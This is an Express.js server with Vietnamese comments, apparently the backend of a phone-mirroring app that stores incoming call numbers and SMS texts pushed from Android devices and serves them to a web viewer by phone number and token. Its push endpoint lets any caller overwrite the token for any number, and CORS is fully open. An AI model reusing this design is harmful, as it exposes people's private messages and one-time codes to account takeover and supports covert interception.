const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

console.log("START", new Date().toISOString());

process.on("SIGTERM", () => {
    console.log("SIGTERM RECEIVED");
});

process.on("SIGINT", () => {
    console.log("SIGINT RECEIVED");
});

process.on("uncaughtException", err => {
    console.error("UNCAUGHT", err);
});

process.on("unhandledRejection", err => {
    console.error("UNHANDLED", err);
});

const DB_FILE = path.join(__dirname, 'all_logs.json');

function readDatabase() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}));
            return {};
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return data.trim() ? JSON.parse(data) : {};
    } catch (error) {
        console.error("Lỗi đọc file database:", error);
        return {};
    }
}

function writeDatabase(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4), 'utf8');
    } catch (error) {
        console.error("Lỗi ghi file database:", error);
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'app.html'));
});

app.post('/api/push', (req, res) => {
    const { myPhoneNumber, token, type, incomingNumber, content, time } = req.body;

    // Kiểm tra tối thiểu phải có Số điện thoại
    if (!myPhoneNumber) {
        return res.status(400).json({ error: "Thiếu thông tin Số điện thoại thiết bị!" });
    }

    let db = readDatabase(); // Đọc file all_logs.json

    // 1. Nếu chưa có tài khoản trên Server -> Khởi tạo shell mới
    if (!db[myPhoneNumber]) {
        db[myPhoneNumber] = {
            token: token || "", // Lấy theo Android, nếu Android trống thì Server trống
            createdAt: new Date().toISOString(),
            calls: [],
            sms: []
        };
        console.log(`[SYSTEM] Khởi tạo tài khoản mới cho: ${myPhoneNumber}`);
    } 
    
    // 2. 🌟 ĐỒNG BỘ THEO ANDROID (QUYỀN CAO HƠN): 
    // Nếu tài khoản đã tồn tại nhưng Token trên Server khác với Token Android gửi lên
    else if (db[myPhoneNumber].token !== token) {
        console.log(`[SYNC] Token bị lệch ở request [${type}]. Cập nhật Token của ${myPhoneNumber}: "${db[myPhoneNumber].token}" -> "${token}"`);
        db[myPhoneNumber].token = token || ""; // Cập nhật theo Android (chấp nhận cả chuỗi rỗng)
    }

    // ==========================================
    // SAU KHI ĐỒNG BỘ TOKEN XONG, XỬ LÝ THEO LOẠI REQUEST
    // ==========================================

    // Kịch bản A: Request xóa mã (RESET) hoặc Kiểm tra định kỳ (PING)
    if (type === "RESET" || type === "PING") {
        writeDatabase(db); // Lưu lại thay đổi Token vào file JSON
        console.log(`[HEARTBEAT] Thiết bị ${myPhoneNumber} xử lý lệnh ${type} thành công.`);
        return res.status(200).json({ status: "SUCCESS", message: `Đã đồng bộ trạng thái ${type}.` });
    }

    // Kịch bản B: Request log dữ liệu thực tế (CALL hoặc SMS)
    const logItem = {
        id: `${Date.now()}_${type}_${Math.floor(100 + Math.random() * 900)}`,
        incomingNumber: incomingNumber,
        content: content,
        time: time
    };

    if (type === "CALL") {
        db[myPhoneNumber].calls = db[myPhoneNumber].calls || [];
        db[myPhoneNumber].calls.push(logItem);
    } else if (type === "SMS") {
        db[myPhoneNumber].sms = db[myPhoneNumber].sms || [];
        db[myPhoneNumber].sms.push(logItem);
    }

    writeDatabase(db); // Lưu toàn bộ dữ liệu vào ổ đĩa
    console.log(`[DATA] Đã ghi nhận log ${type} từ số ${incomingNumber} cho user ${myPhoneNumber}`);
    
    return res.status(200).json({ status: "SUCCESS" });
});

app.get('/api/fetch', (req, res) => {
    const { phone, token, lastId } = req.query;

    // 🌟 BỔ SUNG: Chặn ngay từ vòng gửi xe nếu user trên Web gửi token rỗng, trống hoặc không truyền
    if (!token || token.trim() === "") {
        console.log(`[WEB REJECT] Từ chối fetch dữ liệu của số ${phone} vì Web gửi Token rỗng.`);
        return res.status(401).json({ error: "Token không được để trống!" });
    }

    let db = readDatabase();

    // Kiểm tra tài khoản tồn tại và khớp mã Token (Lúc này chắc chắn token gửi lên không rỗng)
    if (!db[phone] || db[phone].token !== token) {
        return res.status(403).json({ error: "Sai thông tin hoặc chưa kích hoạt!" });
    }

    const accountData = db[phone];

    // Trả về dữ liệu an toàn khi mọi điều kiện đã thỏa mãn
    return res.status(200).json({
        phone: phone,
        calls: (accountData.calls || []).map(item => ({
            ...item,
            isNew: (lastId && lastId.trim() !== "") ? (item.id > lastId) : false
        })),
        sms: (accountData.sms || []).map(item => ({
            ...item,
            isNew: (lastId && lastId.trim() !== "") ? (item.id > lastId) : false
        }))
    });
});

app.post('/api/clear', (req, res) => {
    const { phone, token } = req.body;
    if (!phone || !token) return res.status(400).json({ error: "Thiếu thông tin!" });

    let db = readDatabase();
    if (db[phone] && db[phone].token === token) {
        db[phone].calls = [];
        db[phone].sms = [];
        writeDatabase(db);
        console.log(`[SYSTEM] Đã xóa sạch dữ liệu của số ${phone}`);
        return res.status(200).json({ status: "SUCCESS" });
    }
    return res.status(403).json({ error: "Xác thực thất bại!" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=== SERVER GƯƠNG CHIẾU INFORMINI ĐANG CHẠY TẠI PORT: ${PORT} ===`);
});